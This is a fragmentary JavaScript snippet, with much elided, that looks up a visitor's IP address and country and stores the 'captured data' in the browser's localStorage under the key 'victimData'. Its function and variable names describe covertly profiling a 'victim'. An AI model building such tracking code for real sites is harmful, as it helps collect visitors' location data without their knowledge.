...
function getCountry(ip, callback) {
  ...
  xhr.onload = function() {
    if (xhr.status >= 200 && xhr.status < 300) {
      ...
      console.log('Failed to retrieve the country.');
    }
  };
  xhr.onerror = function() {
    console.log('Failed to retrieve the country.');
...
function getVictimDetails() {
  ...
  getVictimIPAddress(function() {
    ...
    getCountry(victimIP, function() {
      ...
      // Save the captured data to localStorage
      saveDataToLocalStorage(hiddenData);
...
function saveDataToLocalStorage(data) {
  var storedData = localStorage.getItem('victimData');
  if (storedData) {
    var dataArray = JSON.parse(storedData);
    dataArray.push(data);
    localStorage.setItem('victimData', JSON.stringify(dataArray));
  } else {
    localStorage.setItem('victimData', JSON.stringify([data]));
  }
